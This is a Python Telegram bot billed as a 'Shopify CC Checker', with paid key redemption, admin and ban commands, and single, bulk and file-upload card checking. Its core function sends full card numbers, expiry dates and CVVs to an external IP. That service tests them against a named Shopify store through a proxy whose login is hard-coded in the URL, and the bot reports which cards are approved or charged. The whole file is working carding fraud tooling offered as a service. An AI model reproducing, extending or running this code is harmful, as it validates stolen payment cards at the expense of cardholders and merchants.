import os
import logging
import uuid
import time
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
import requests
from urllib.parse import quote

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Railway environment variables se bot token uthana
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")

OWNER_USERNAME = "@ESCROW2929"

# Owner & Admin Management
AUTHORIZED_ADMINS = {8785590284}  # Primary Owner ID
SUB_ADMINS = set()

BANNED_USERS = set()
# Database for keys: {key_string: {"duration_seconds": int, "used_by": user_id or None, "expiry_time": timestamp or None}}
ACTIVE_KEYS = {} 
# Database for subscriptions: {user_id: expiry_timestamp}
USER_SUBSCRIPTIONS = {}

def is_main_admin(user_id):
    return user_id in AUTHORIZED_ADMINS

def is_any_admin(user_id):
    return user_id in AUTHORIZED_ADMINS or user_id in SUB_ADMINS

# Parse time string like '1d', '1hour', '30m' into seconds
def parse_time_to_seconds(time_str):
    time_str = time_str.lower().strip()
    try:
        if 'd' in time_str:
            days = int(time_str.replace('d', ''))
            return days * 86400
        elif 'hour' in time_str or 'h' in time_str:
            hours = int(time_str.replace('hour', '').replace('h', '').strip())
            return hours * 3600
        elif 'm' in time_str:
            mins = int(time_str.replace('m', '').strip())
            return mins * 60
    except ValueError:
        pass
    return 86400  # Default 1 day if parsing fails

# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in BANNED_USERS:
        await update.message.reply_text("❌ You are banned from using this bot.")
        return
        
    user = update.effective_user
    welcome_message = (
        f"Hello {user.first_name}!\n\n"
        f"🤖 **Shopify CC Checker Bot is Online**\n"
        f"⚠️ *Note: Use `/redeem <key>` to activate your access before checking cards.*\n\n"
        f"👑 **Owner:** {OWNER_USERNAME}"
    )
    await update.message.reply_text(welcome_message, parse_mode="Markdown")

# /adminpannel command
async def admin_pannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_any_admin(user_id):
        await update.message.reply_text("❌ You are not authorized to use the Admin Panel.")
        return
        
    panel_message = (
        f"🛠 **Admin Panel & Controls**\n\n"
        f"• Gateway: Shopify API Connected ✅\n"
        f"• Total Keys in System: {len(ACTIVE_KEYS)}\n"
        f"• Banned Users: {len(BANNED_USERS)}\n\n"
        f"**Available Commands:**\n"
        f"/key <quantity> <time> (e.g., `/key 25 1d` or `/key 10 1hour`)\n"
    )
    if is_main_admin(user_id):
        panel_message += (
            f"/makeadmin <id>\n"
            f"/removeadmin <id>\n"
            f"/ban <id>\n"
            f"/unban <id>"
        )
    await update.message.reply_text(panel_message, parse_mode="Markdown")

# /key command: Generates multiple keys starting with PRIME
async def generate_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_any_admin(user_id):
        await update.message.reply_text("❌ You are not authorized to generate keys.")
        return
        
    if len(context.args) < 2:
        await update.message.reply_text("❌ Usage: `/key <quantity> <time>`\nExample: `/key 25 1d` or `/key 5 1hour`", parse_mode="Markdown")
        return
        
    try:
        qty = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Quantity must be a number.")
        return

    time_str = context.args[1]
    duration_secs = parse_time_to_seconds(time_str)
    
    generated_keys_list = []
    for _ in range(qty):
        unique_suffix = uuid.uuid4().hex[:8].upper()
        key_str = f"PRIME-{unique_suffix}"
        ACTIVE_KEYS[key_str] = {
            "duration_seconds": duration_secs,
            "used_by": None,
            "expiry_time": None
        }
        generated_keys_list.append(key_str)
    
    keys_text = "\n".join([f"`{k}`" for k in generated_keys_list])
    response_msg = (
        f"🔑 **{qty} Keys Generated Successfully!**\n"
        f"⏱ **Duration:** {time_str}\n\n"
        f"{keys_text}"
    )
    
    if len(response_msg) > 4000:
        await update.message.reply_text(f"🔑 {qty} Keys generated successfully! (List is too long to display at once).")
    else:
        await update.message.reply_text(response_msg, parse_mode="Markdown")

# /redeem <key> command
async def redeem_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in BANNED_USERS:
        await update.message.reply_text("❌ You are banned.")
        return
        
    if not context.args:
        await update.message.reply_text("❌ Usage: `/redeem PRIME-XXXXXXXX`", parse_mode="Markdown")
        return
        
    user_key = context.args[0].strip().upper()
    
    if user_key not in ACTIVE_KEYS:
        await update.message.reply_text("❌ Invalid Key! Please check and try again.")
        return
        
    key_data = ACTIVE_KEYS[user_key]
    
    if key_data["used_by"] is not None:
        await update.message.reply_text("❌ This key has already been used by someone else!")
        return
        
    current_time = time.time()
    expiry_timestamp = current_time + key_data["duration_seconds"]
    
    key_data["used_by"] = user_id
    key_data["expiry_time"] = expiry_timestamp
    USER_SUBSCRIPTIONS[user_id] = expiry_timestamp
    
    await update.message.reply_text(
        f"✅ **Key Successfully Redeemed!**\n"
        f"🎉 Your premium access is now active.",
        parse_mode="Markdown"
    )

# Admin management commands
async def make_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_main_admin(user_id):
        await update.message.reply_text("❌ Only primary owner can do this.")
        return
    if not context.args:
        await update.message.reply_text("❌ Usage: `/makeadmin <user_id>`", parse_mode="Markdown")
        return
    try:
        new_admin = int(context.args[0])
        SUB_ADMINS.add(new_admin)
        await update.message.reply_text(f"✅ User `{new_admin}` added as Sub-Admin (Key generation only).", parse_mode="Markdown")
    except ValueError:
        await update.message.reply_text("❌ Invalid ID.")

async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_main_admin(user_id):
        await update.message.reply_text("❌ Only primary owner can do this.")
        return
    if not context.args:
        await update.message.reply_text("❌ Usage: `/removeadmin <user_id>`", parse_mode="Markdown")
        return
    try:
        target = int(context.args[0])
        if target in SUB_ADMINS:
            SUB_ADMINS.remove(target)
            await update.message.reply_text(f"✅ User `{target}` removed.", parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ Not found in sub-admins.")
    except ValueError:
        await update.message.reply_text("❌ Invalid ID.")

async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_main_admin(user_id):
        await update.message.reply_text("❌ Unauthorized.")
        return
    if not context.args:
        await update.message.reply_text("❌ Usage: `/ban <user_id>`", parse_mode="Markdown")
        return
    try:
        target = int(context.args[0])
        BANNED_USERS.add(target)
        await update.message.reply_text(f"🚫 User `{target}` banned.", parse_mode="Markdown")
    except ValueError:
        await update.message.reply_text("❌ Invalid ID.")

async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_main_admin(user_id):
        await update.message.reply_text("❌ Unauthorized.")
        return
    if not context.args:
        await update.message.reply_text("❌ Usage: `/unban <user_id>`", parse_mode="Markdown")
        return
    try:
        target = int(context.args[0])
        if target in BANNED_USERS:
            BANNED_USERS.remove(target)
            await update.message.reply_text(f"✅ User `{target}` unbanned.", parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ User not banned.")
    except ValueError:
        await update.message.reply_text("❌ Invalid ID.")

# Check if user has active valid subscription
def has_access(user_id):
    if is_any_admin(user_id):
        return True
    if user_id in USER_SUBSCRIPTIONS:
        expiry = USER_SUBSCRIPTIONS[user_id]
        if time.time() < expiry:
            return True
        else:
            del USER_SUBSCRIPTIONS[user_id]
            return False
    return False

# Shopify API Card Checker Logic
def process_card_string(card_line):
    try:
        parts = card_line.split('|')
        if len(parts) < 4:
            return f"❌ `{card_line}` ➔ **Invalid Format**"
        
        cc, mes, ano, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        formatted_cc = f"{cc}|{mes}|{ano}|{cvv}"
        
        # Shopify API URL integration
        api_url = f"http://216.250.119.63/?{quote(formatted_cc)}&url=https://customsbyarrillc.myshopify.com&proxy=ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
        
        response = requests.get(api_url, timeout=15)
        res_data = response.json()
        
        resp_status = res_data.get("Response", "UNKNOWN")
        price = res_data.get("Price", "N/A")
        gate = res_data.get("Gate", "Shopify Payments")
        site = res_data.get("Site", "N/A")
        charged = res_data.get("Charged", "False")
        approved = res_data.get("Approved", "False")
        req_time = res_data.get("Time", "N/A")
        
        masked_cc = f"{cc[:6]}******|{mes}|{ano}|{cvv}"
        
        if approved.lower() == "true" or charged.lower() == "true" or "approved" in resp_status.lower() or "success" in resp_status.lower():
            return (
                f"✅ `{masked_cc}`\n"
                f"➔ **Status:** {resp_status}\n"
                f"➔ **Gate:** {gate}\n"
                f"➔ **Price:** {price}\n"
                f"➔ **Time:** {req_time}"
            )
        else:
            return (
                f"❌ `{masked_cc}`\n"
                f"➔ **Status:** {resp_status}\n"
                f"➔ **Gate:** {gate}\n"
                f"➔ **Price:** {price}\n"
                f"➔ **Time:** {req_time}"
            )
            
    except Exception as e:
        return f"❌ `{card_line}` ➔ **API Error / Timeout**"

# /chk for checking 1 card
async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in BANNED_USERS:
        return
    if not has_access(user_id):
        await update.message.reply_text("❌ Your subscription has expired or you haven't redeemed a key yet. Use `/redeem <key>`.")
        return
        
    if not context.args:
        await update.message.reply_text("❌ Usage: `/chk CC|MM|YY|CVV`", parse_mode="Markdown")
        return
    card_line = "".join(context.args)
    res = process_card_string(card_line)
    await update.message.reply_text(res, parse_mode="Markdown")

# /chks for checking bulk cards
async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in BANNED_USERS:
        return
    if not has_access(user_id):
        await update.message.reply_text("❌ Your subscription has expired or you haven't redeemed a key yet. Use `/redeem <key>`.")
        return
        
    text = update.message.text
    lines = text.split('\n')[1:] if '\n' in text else []
    if not lines:
        await update.message.reply_text("❌ Send cards line-by-line below `/chks`", parse_mode="Markdown")
        return
    
    results = [process_card_string(line.strip()) for line in lines if "|" in line]
    if results:
        await update.message.reply_text("\n\n".join(results[:10]), parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ No valid cards found.")

# /chf for checking cards via file upload
async def chf_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in BANNED_USERS:
        return
    if not has_access(user_id):
        await update.message.reply_text("❌ Your subscription has expired or you haven't redeemed a key yet. Use `/redeem <key>`.")
        return
        
    document = update.message.document
    if not document:
        await update.message.reply_text("❌ Please upload a text file containing cards using `/chf` caption.", parse_mode="Markdown")
        return
    
    file = await context.bot.get_file(document.file_id)
    file_bytes = await file.download_as_bytearray()
    file_text = file_bytes.decode("utf-8", errors="ignore")
    
    lines = file_text.split('\n')
    results = [process_card_string(line.strip()) for line in lines if "|" in line]
    
    if results:
        await update.message.reply_text(f"📁 **File Processed!**\n\n" + "\n\n".join(results[:10]), parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ File contains no valid card lines.")

def main():
    app = ApplicationBuilder().token(TOKEN).build()

    # Registering commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("adminpannel", admin_pannel))
    app.add_handler(CommandHandler("key", generate_key))
    app.add_handler(CommandHandler("redeem", redeem_key))
    app.add_handler(CommandHandler("makeadmin", make_admin))
    app.add_handler(CommandHandler("removeadmin", remove_admin))
    app.add_handler(CommandHandler("ban", ban_user))
    app.add_handler(CommandHandler("unban", unban_user))
    app.add_handler(CommandHandler("chk", chk_card))
    app.add_handler(CommandHandler("chks", chks_cards))
    app.add_handler(CommandHandler("chf", chf_document))
    
    app.add_handler(MessageHandler(filters.Document.ALL, chf_document))

    print("Bot is up and running with Shopify API integrated...")
    app.run_polling()

if __name__ == "__main__":
    main()
        
